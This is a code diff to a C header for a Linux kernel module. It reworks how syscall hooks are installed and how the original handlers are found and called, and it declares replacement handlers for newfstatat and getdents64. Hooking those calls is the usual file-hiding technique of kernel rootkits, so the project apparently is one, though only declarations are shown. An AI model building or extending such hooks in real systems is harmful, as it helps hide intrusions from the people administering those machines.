@@ -1,12 +1,18 @@
 #pragma once
-#include <linux/fs.h> // required for syscall numbers (__NR_...)
 #include <linux/module.h>
 
 typedef asmlinkage int64_t syscall_t(const struct pt_regs *);
 
-bool hooks_clean(uint64_t **systable);
-bool hooks_setup(uint64_t **systable);
-syscall_t *hooks_find_orig(uint16_t num);
+bool hooks_install(void);
+void hooks_uninstall(void);
+
+void *hooks_orig_find(const char *symbol);
+#define orig_get(o, n)                                                         \
+  if (NULL == o) {                                                             \
+    o = hooks_orig_find("__x64_sys_" n);                                       \
+  }
+int64_t hooks_orig_call(syscall_t *orig, const struct pt_regs *r);
+#define orig_call(o) return (hooks_orig_call(o, r))
 
 asmlinkage int64_t h_newfstatat(const struct pt_regs *r);
 asmlinkage int64_t h_getdents64(const struct pt_regs *r);
